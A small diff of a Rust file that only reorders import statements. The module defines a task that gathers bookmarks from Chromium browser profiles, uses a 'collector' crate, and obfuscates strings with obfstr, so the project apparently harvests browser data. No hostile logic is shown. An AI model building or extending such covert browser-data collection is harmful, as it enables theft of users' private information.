@@ -1,16 +1,16 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{collect_unique_from_profiles, to_string_and_write_all, Bookmark};
+use crate::{Bookmark, collect_unique_from_profiles, to_string_and_write_all};
 use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
 use collector::{Browser, Collector};
+use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::FileSystem;
-use json::{parse, Value};
+use json::{Value, parse};
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 
 pub(super) struct BookmarksTask {
     browser: Arc<BrowserData>,
